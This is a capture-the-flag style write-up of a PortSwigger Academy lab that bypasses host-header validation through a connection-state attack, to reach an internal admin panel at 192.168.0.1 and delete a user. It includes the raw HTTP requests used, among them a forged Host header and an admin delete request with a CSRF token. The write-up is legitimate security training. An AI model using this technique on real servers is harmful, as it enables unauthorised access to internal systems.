
# Host validation bypass via connection state attack

This lab is vulnerable to routing-based SSRF via the Host header. Although the front-end server may initially appear to perform robust validation of the Host header, it makes assumptions about all requests on a connection based on the first request it receives.

To solve the lab, exploit this behavior to access an internal admin panel located at 192.168.0.1/admin, then delete the user carlos.

Note: Solving this lab requires features first released in Burp Suite 2022.8.1.

This lab is based on real-world vulnerabilities discovered by PortSwigger Research. For more details, check out Browser-Powered Desync Attacks: A New Frontier in HTTP Request Smuggling.

---------------------------------------------

References: 

- https://portswigger.net/web-security/host-header/exploiting

- https://portswigger.net/research/browser-powered-desync-attacks#state





![img](images/Host%20validation%20bypass%20via%20connection%20state%20attack/1.png)

![img](images/Host%20validation%20bypass%20via%20connection%20state%20attack/2.png)

---------------------------------------------


First send a request to the home page using the legitimate “Host” header:



![img](images/Host%20validation%20bypass%20via%20connection%20state%20attack/3.png)


Then quickly send a request to “/admin” changing the “Host” header to “192.168.0.1”:



![img](images/Host%20validation%20bypass%20via%20connection%20state%20attack/4.png)


After a redirection you get to the admin panel and can find the “csrf” value:



![img](images/Host%20validation%20bypass%20via%20connection%20state%20attack/5.png)


After sending a request to “/” with the legitimate “Host” header, send the request to delete the user:

```
GET / HTTP/2
Host: 0a6a005e030d906b874c2bf300490073.web-security-academy.net
...
```

```
POST /admin/delete HTTP/2
Host: 192.168.0.1
...

username=carlos&csrf=CY6qJXGEMwYMKu0z18mEKfFo2zAoE866
```



![img](images/Host%20validation%20bypass%20via%20connection%20state%20attack/6.png)